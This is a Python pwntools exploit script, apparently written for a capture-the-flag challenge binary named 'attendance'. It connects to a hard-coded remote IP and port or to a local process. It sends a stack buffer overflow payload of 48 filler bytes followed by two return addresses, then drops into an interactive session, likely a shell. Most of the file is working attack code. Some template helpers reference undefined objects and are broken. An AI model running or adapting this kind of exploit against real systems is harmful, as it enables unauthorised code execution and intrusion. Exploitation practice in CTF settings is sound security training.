#!/usr/bin/env python

from pwn import *
import sys
import time
import argparse
import string

# ============================================================== #
# ========================== SETTINGS ========================== #
# ============================================================== #

context.arch = 'i386'
context.os = 'linux'
context.endian = 'little'
context.word_size = 32
# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.log_level = 'INFO'

# ============================================================== #
# ========================== TEMPLATE ========================== #
# ============================================================== #


WORD32 = 'A'*4    # 32bit
WORD64 = 'X'*8   # 64bit
payload = ''
data = ''

program_name = './attendance'
binary = ELF("attendance")

remote_server = '89.38.210.128'
PORT = 31337

parser = argparse.ArgumentParser(description='Exploit the bins.')
parser.add_argument('--dbg'   , '-d', action="store_true")
parser.add_argument('--remote', '-r', action="store_true")
parser.add_argument('--lib', '-l', action="store_true")
args = parser.parse_args()

if args.remote:
    p = remote(remote_server, PORT)
else:
    p = process(program_name)

if args.lib:
    libc = ELF("libc.so.6") #determin libc-version: ldd ./program_name
    r = main.process(env={'LD_PRELOAD' : libc.path})

if args.dbg:
    gdb.attach(p, '''
    vmmap
    b *main
    b *0x08048a97
    ''')

# USEFUL FUNCTIONS
def console_output():
    data = p.recv(2000)
    # print data

def send_data(payload):
    # print '[*] payload'
    p.sendline(payload)

def wait_for_prompt(sentence):
  print r.recvuntil(sentence)

def get_symbols(x, y):
    x = p32(binary.symbols[y])
    # Example: read_got = p32(binary.symbols["read"])

def search_binsh():
    return libc.search("/bin/sh").next()

# ============================================================== #
# ====================== FLOW OF PROGRAM ======================= #
# ============================================================== #

if __name__ == "__main__":

    p.sendline('31337')
    p.sendline('A'*48+p32(0x0804867e)+p32(0x08048b20))

    p.interactive()
